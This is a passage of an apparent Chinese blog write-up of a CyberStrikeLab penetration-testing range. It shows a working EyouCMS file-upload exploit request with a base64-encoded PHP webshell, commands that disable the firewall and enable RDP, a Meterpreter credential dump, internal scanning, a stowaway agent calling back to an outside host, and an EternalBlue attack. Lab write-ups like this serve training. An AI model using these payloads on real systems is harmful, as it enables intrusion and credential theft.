<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/nq5t09qnH8ePVEpcyZyT3/_buildManifest.js" defer=""></script><script src="/_next/static/nq5t09qnH8ePVEpcyZyT3/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"CyberstrikelabLab-1","contentHtml":"\u003ch1\u003eLab-1\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.cyberstrikelab.com/#/scene/detail/20\"\u003ehttps://www.cyberstrikelab.com/#/scene/detail/20\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003eYoucms\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eyoucms\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网上能找到 \u003ccode\u003eyoucms\u003c/code\u003e 前台 \u003ccode\u003egetshell\u003c/code\u003e 的利用\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/qq_48985780/article/details/121945304\"\u003ehttps://blog.csdn.net/qq_48985780/article/details/121945304\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ePOST /index.php/api/Uploadify/preview HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\nAccept-Language: zh-CN,zh;q=\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e,zh-TW;q=\u003cspan class=\"hljs-number\"\u003e0.7\u003c/span\u003e,zh-HK;q=\u003cspan class=\"hljs-number\"\u003e0.5\u003c/span\u003e,en-US;q=\u003cspan class=\"hljs-number\"\u003e0.3\u003c/span\u003e,en;q=\u003cspan class=\"hljs-number\"\u003e0.2\u003c/span\u003e\nUpgrade-Insecure-Requests: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nPriority: u=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, i\nUser-Agent: Mozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e141.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e141.0\u003c/span\u003e\nAccept-Encoding: gzip, deflate\nSec-GPC: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=\u003cspan class=\"hljs-number\"\u003e0.9\u003c/span\u003e,*\u003cspan class=\"hljs-comment\"\u003e/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgcGhwaW5mbygpOw==\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问返回包中的 \u003ccode\u003epreview/xxxxxxx.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写入一句话木马\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ePOST /index.php/api/Uploadify/preview HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\nAccept-Language: zh-CN,zh;q=\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e,zh-TW;q=\u003cspan class=\"hljs-number\"\u003e0.7\u003c/span\u003e,zh-HK;q=\u003cspan class=\"hljs-number\"\u003e0.5\u003c/span\u003e,en-US;q=\u003cspan class=\"hljs-number\"\u003e0.3\u003c/span\u003e,en;q=\u003cspan class=\"hljs-number\"\u003e0.2\u003c/span\u003e\nUpgrade-Insecure-Requests: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nPriority: u=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, i\nUser-Agent: Mozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e141.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e141.0\u003c/span\u003e\nAccept-Encoding: gzip, deflate\nSec-GPC: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=\u003cspan class=\"hljs-number\"\u003e0.9\u003c/span\u003e,*\u003cspan class=\"hljs-comment\"\u003e/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsneCddKTs=\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试，是 \u003ccode\u003ewindows\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e192.168.10.10\u003c/h2\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先把防火墙关了，然后开启远程桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ePS C:\\phpstudy_pro\\WWW\\eyoucms1.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\\preview\u003e netsh advfirewall set allprofiles state off\nOk.\n\nPS C:\\phpstudy_pro\\WWW\\eyoucms1.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\\preview\u003e REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d \u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e /f\nThe operation completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e之后再上线 \u003ccode\u003eVshell\u003c/code\u003e ，使用一键上线命令即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eC\u003c/code\u003e 盘根目录第一个 flag\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eC:\\\u003etype flag.txt\ngo-flag{kn6anDUCzBqtjlX8}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里为了方便所以上 \u003ccode\u003eMSF\u003c/code\u003e 抓了下 \u003ccode\u003eHASH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里可以使用 \u003ccode\u003eevil-winrm\u003c/code\u003e 进行登陆了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003emeterpreter \u003e creds_all\n[+] Running \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername       Domain           NTLM                              SHA1\n--------       ------           ----                              ----\nAdministrator  WIN-KOHRC1DGOL9  a167976f7bd8d93ee232fa7a87a4079e  \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003eb8bca113dee7e588272b1ca6b73b16d017d4434\n\nwdigest credentials\n===================\n\nUsername          Domain           Password\n--------          ------           --------\n(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)            (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)           (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\nAdministrator     WIN-\u003cspan class=\"hljs-title function_ invoke__\"\u003eKOHRC1DGOL9\u003c/span\u003e  (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\nWIN-KOHRC1DGOL9$  \u003cspan class=\"hljs-title function_ invoke__\"\u003eWORKGROUP\u003c/span\u003e        (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\n\nkerberos credentials\n====================\n\nUsername          Domain           Password\n--------          ------           --------\n(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)            (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)           (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\nAdministrator     WIN-\u003cspan class=\"hljs-title function_ invoke__\"\u003eKOHRC1DGOL9\u003c/span\u003e  (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\nwin-kohrc1dgol9$  \u003cspan class=\"hljs-title function_ invoke__\"\u003eWORKGROUP\u003c/span\u003e        (\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eIP\u003c/code\u003e 信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eC:\\\u003eipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网 \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::\u003cspan class=\"hljs-variable constant_\"\u003ef934\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2031\u003c/span\u003e:ffb0:abe5%\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e\n   IPv4 地址 . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\n   子网掩码  . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e255.0\u003c/span\u003e\n   默认网关. . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e10.233\u003c/span\u003e\n\n以太网适配器 以太网实例 \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::\u003cspan class=\"hljs-variable constant_\"\u003edd76\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003ec3:eada:\u003cspan class=\"hljs-number\"\u003e75\u003c/span\u003efb%\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e\n   IPv4 地址 . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.10\u003c/span\u003e\n   子网掩码  . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e255.0\u003c/span\u003e\n   默认网关. . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.1\u003c/span\u003e\n\n隧道适配器 isatap.{\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eDA50EBB-\u003cspan class=\"hljs-number\"\u003e5871\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4387\u003c/span\u003e-AB71-FF1EF08A5B10}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n\n隧道适配器 isatap.{\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eA087C82-\u003cspan class=\"hljs-number\"\u003e408\u003c/span\u003eA-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eC20-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003eEB3-\u003cspan class=\"hljs-number\"\u003e4E5\u003c/span\u003eC11A340D7}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到内网网段 \u003ccode\u003e192.168.20.x\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003efscan\u003c/code\u003e 扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ePS C:\\\u003e ./fscan -h \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e255\u003c/span\u003e\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-08-12 07:42:18] [INFO] 暴力破解线程数: 1\n[2025-08-12 07:42:18] [INFO] 开始信息扫描\n[2025-08-12 07:42:18] [INFO] 生成IP范围: 192.168.20.1 - 192.168.20.255\n[2025-08-12 07:42:18] [INFO] 最终有效主机数量: 255\n[2025-08-12 07:42:18] [INFO] 开始主机扫描\n[2025-08-12 07:42:18] [SUCCESS] 目标 192.168.20.10   存活 (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.20   存活 (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.30   存活 (ICMP)\n[2025-08-12 07:42:21] [INFO] 存活主机数量: 3\n[2025-08-12 07:42:21] [INFO] 有效端口数量: 233\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.20:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:88\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:80\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:389\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:139\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:139\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:139\n[2025-08-12 07:42:26] [SUCCESS] 端口开放 192.168.20.10:3306\n[2025-08-12 07:42:26] [SUCCESS] 服务识别 192.168.20.10:3306 =\u003e [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host '\u003c/span\u003eWIN-KOHRC1DGOL9\u003cspan class=\"hljs-string\"\u003e' is not allowed\nto connect to this MySQL server]\n[2025-08-12 07:42:27] [SUCCESS] 服务识别 192.168.20.30:88 =\u003e \n[2025-08-12 07:42:30] [SUCCESS] 服务识别 192.168.20.10:80 =\u003e [http]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:445 =\u003e \n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:139 =\u003e  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:139 =\u003e  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:445 =\u003e \n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:139 =\u003e  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:445 =\u003e \n[2025-08-12 07:42:36] [SUCCESS] 服务识别 192.168.20.30:389 =\u003e \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.30:135 =\u003e \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.20:135 =\u003e \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.10:135 =\u003e \n[2025-08-12 07:43:27] [INFO] 存活端口数量: 13\n[2025-08-12 07:43:27] [INFO] 开始漏洞扫描\n[2025-08-12 07:43:27] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.10\n主机名: WIN-KOHRC1DGOL9\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.10.10\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.20\n主机名: cyberweb\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.20\n[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.20 [Windows Server 2012 R2 Standard 9600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.30 [Windows Server 2008 R2 Standard 7600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.30\n主机名: WIN-7NRTJO59O7N\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.30\n[2025-08-12 07:43:28] [SUCCESS] NetBios 192.168.20.10   WORKGROUP\\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:30] [SUCCESS] 网站标题 http://192.168.20.10      状态码:200 长度:25229  标题:易优CMS -  Powered by Eyoucms.com\n[2025-08-12 07:43:40] [SUCCESS] 目标: http://192.168.20.10:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e192.168.20.20\u003c/code\u003e 和 \u003ccode\u003e30\u003c/code\u003e 发现永恒之蓝\u003c/p\u003e\n\u003ch2\u003e192.168.20.20 - 1\u003c/h2\u003e\n\u003cp\u003e打永恒之蓝需要搭代理\u003c/p\u003e\n\u003cp\u003e这里使用 \u003ccode\u003estowaway\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e./linux_x64_admin -l \u003cspan class=\"hljs-number\"\u003e8000\u003c/span\u003e -s \u003cspan class=\"hljs-number\"\u003e123\u003c/span\u003e\n\nStart-Process -FilePath \u003cspan class=\"hljs-string\"\u003e\"C:\\agent.exe\"\u003c/span\u003e -ArgumentList \u003cspan class=\"hljs-string\"\u003e\"-c 172.16.233.2:8000 -s 123 --reconnect 8\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e(admin) \u003e\u003e \u003cspan class=\"hljs-keyword\"\u003euse\u003c/span\u003e 0\n(\u003cspan class=\"hljs-title\"\u003enode\u003c/span\u003e 0) \u003e\u003e \u003cspan class=\"hljs-title\"\u003esocks\u003c/span\u003e 4444 \u003cspan class=\"hljs-title\"\u003eadmin\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eadmin\u003c/span\u003e\n[*] \u003cspan class=\"hljs-title\"\u003eTrying\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eto\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003elisten\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eon\u003c/span\u003e 0.0.0.0:4444......\n[*] \u003cspan class=\"hljs-title\"\u003eWaiting\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eagent\u003c/span\u003e'\u003cspan class=\"hljs-title\"\u003es\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eresponse\u003c/span\u003e......\n[*] \u003cspan class=\"hljs-title\"\u003eSocks\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003estart\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003esuccessfully\u003c/span\u003e!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置好代理后用 \u003ccode\u003eMSF\u003c/code\u003e 打永恒之蓝\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e➜  Lab1 proxychains -q msfconsole\nsearch ms17_010\n\u003cspan class=\"hljs-keyword\"\u003euse\u003c/span\u003e 19\n\u003cspan class=\"hljs-title\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecommand\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ewhoami\u003c/span\u003e\n\u003cspan class=\"hljs-title\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003erhost\u003c/span\u003e 192.168.20.20\n\u003cspan class=\"hljs-title\"\u003erun\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是这里应该是被修复了，先放着\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003emsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eauxiliary\u003c/span\u003e(admin/smb/ms17_010_command) \u003e exploit\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Target OS: Windows Server \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e R2 Standard \u003cspan class=\"hljs-number\"\u003e9600\u003c/span\u003e\n[-] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Unable to find accessible named pipe!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ehosts\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e192.168.20.30\u003c/h2\u003e\n\u003cp\u003e转换目标，打 \u003ccode\u003e192.168.20.30\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003emsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eauxiliary\u003c/span\u003e(admin/smb/ms17_010_command) \u003e set rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e\nrhost =\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan 